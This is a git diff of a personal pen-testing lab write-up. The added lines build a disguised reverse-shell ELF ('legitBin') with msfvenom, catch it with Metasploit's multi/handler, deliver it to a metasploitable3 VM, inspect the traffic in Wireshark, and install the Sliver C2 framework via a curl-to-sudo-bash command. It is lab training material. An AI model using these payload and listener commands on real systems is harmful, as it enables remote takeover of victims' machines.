@@ -3,88 +3,81 @@
 - Create malware using msfvenom that spins up a reverse shell
 - Accept the connection using metasploits multi/handler
 
+
 ## What's msfvenom?
 => A payload generator and encoder
 - Source: msfvenom man pages
 
-# ReverC 🐚
-We spin up the Kali VM and go straight to
+## Victim
+I'm using `metasploitable3` for the victim:
+```console
+$ vagrant up ub1404
+```
+More on ms3 [here](<https://github.com/rapid7/metasploitable3>). How I set it up --> [personally](<https://github.com/Ali-Mikael/Pen-testing/blob/main/h3-EternalExploit.md#p-metasploitable3>).
+
+
+## ReverC 🐚
+Start up the Kali VM and go straight to man pages to look for help:
 ```bash
 $ man msfvenom
 ```
+
+I got the basic idea but didn't know which output format to use, so we do:
+```bash
+$ msfvenom --list formats
+```
+
 Then craft the payload:
 ```bash
-$ msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin
+$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.130.233 LPORT=4040 -f elf -o legitBin
 
-# Make the binary executable:
+# Make the binary/payload executable:
 $ chmod +x legitBin
 ```
-`-p`: Payload to use
-`-f`: Output format
-`-o`: Output file
+Flags explained:
+- `-p`: Payload to use `linux/x86/shell_reverse_tcp`
+- `-f`: Output format `elf`
+  - elf a.k.a Executable & Linkable Format is a binary format which can be executed on the system 
+- `-o`: Output file `name_of_the_file`
+
+> [!TIP]
+> Use tab completion to your advantage. For example, after specifying the platform `linux/` (in this case), press tab a few times to get all the available options!
 
 
+In `msfconsole` we use the `multi/handler` module to set up a listener:
+```console
+$ sudo msfconsole
+msf > use exploit/multi/handler
+    > options
+    > set LHOST 192.168.130.233
+    > set LPORT 4040
+    > set payload linux/x86/shell_reverse_tcp    # <-- Match the payload
+    > run
+[*] Started reverse TCP handler on 192.168.130.233:4040 
+```
+Now that the listener is running we can execute the payload on the victims machine to get a reverse shell.
 
-Now we have a payload => `legitBin`
 
 Get the ip of the victim:
 ```bash
 $ sudo nmap -sn -T4 192.168.130.0/24
 
 Nmap scan report for metasploitable3-ub1404 (192.168.130.202)
-Host is up (0.00048s latency).
-MAC Address: 52:54:00:6C:7D:C1 (QEMU virtual NIC)
+Host is up
 ```
 
-Then send:
+
+
+Drop the payload:
 ```bash
 $ rsync -av legitBin vagrant@192.168.130.202:/home/vagrant/
 ```
-I'm using `rsync` here to send it over via SSH, let's play we execute a succesful attack and get the payload on the victims machine.
+I'm using `rsync` to send it over via SSH, let's use our imagination here and say we sent the victim a link which it clicked and downloaded & executed the binary.
 
+<img width="876" height="169" alt="2026-04-30-16:27:06" src="https://github.com/user-attachments/assets/a0d66341-2b3f-481e-ac20-f9e65f27a20c" />
 
-In `msfconsole` we use the `multi/handler` module to act as a listener:
-```console
-msf > search multi/handler
-msf > use 5
-msf exploit(multi/handler) > options
-msf exploit(multi/handler) > set LHOST 192.168.130.233
-LHOST => 192.168.130.233
-msf exploit(multi/handler) > set LPORT 4040
-LPORT => 4040
-
-msf exploit(multi/handler) > run
-[*] Started reverse TCP handler on 192.168.130.233:4040 
-```
-Now that the listener is running we can execute the payload on victims machine.
-
-<img width="766" height="150" alt="2026-04-29-14:08:37" src="https://github.com/user-attachments/assets/812d13e6-a82a-474c-aba6-10d0a135d88f" />
-
-### BUT
-<img width="792" height="62" alt="2026-04-29-14:09:06" src="https://github.com/user-attachments/assets/22861eef-cdb3-4e3b-9f2d-7d92d518f92e" />
-
-<img width="894" height="170" alt="2026-04-29-14:09:18" src="https://github.com/user-attachments/assets/3d065731-c331-411b-b7c2-d52bdc4058a3" />
-
-
-And the connection is gone! The first suspect: payload is not payloading. So I think I have to change the format.
-
-Get a listing of all available format using the command:
-```bash
-$ msfvenom --list formats
-```
-
-I changed the format and tried this:
-```console
-$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.130.202 LPORT=4040 -f xx -o legitBin.xx
-
-$ rsync -av legitBin.xx vagrant@192.168.130.202:/home/vagrant/
-$ sudo msfconsole
-msf > use exploit/multi/handler
-    > set LHOST xxxx
-    > set LPORT xxxx
-    > run
-```
-
+The attacker now has a reverse shell:
+<img width="1793" height="769" alt="2026-04-30-16:26:39" src="https://github.com/user-attachments/assets/e94a33e8-4162-482c-bbe6-40db9c8a2847" />
 
 
 
@@ -96,12 +89,37 @@ msf > use exploit/multi/handler
   - How would one obscure the detection?
  
 
+## Eavesdropping
+I started packet capturing on the attackers interface `eth1` using Wireshark.
+
+We can inspect the data being exchanged more closely by right clicking on one of the packets, then --> `Follow` and lastly --> `TCP Stream`.
+
+`Red` is the attacker and `blue` is the response from the victim:
+
+<img width="1394" height="846" alt="2026-04-30-16:56:30" src="https://github.com/user-attachments/assets/42c6299b-4d5b-49e3-9de1-25c858181a74" />
+
+Talk about red team / blue team...
+
+This makes it obvious that somebody is connected to the machine and executing shell commands. One could obscure it by encrypting the traffic for example!
+
 
 
 
 # C) Hello Sliver
 **Objective**
 - Show an example of an HTTP-connection using Sliver
+
+## What sliver?
+"A powerful command and control framework designed to provide advanced capabilities for covertly managing and controlling remote systems"
+- [source](<https://sliver.sh/>)
+
+
+## Install on kali:
+```bash
+$ sudo apt update && sudo apt install sliver -y
+# OR
+$ curl https://sliver.sh/install | sudo bash
+```
 
 
 
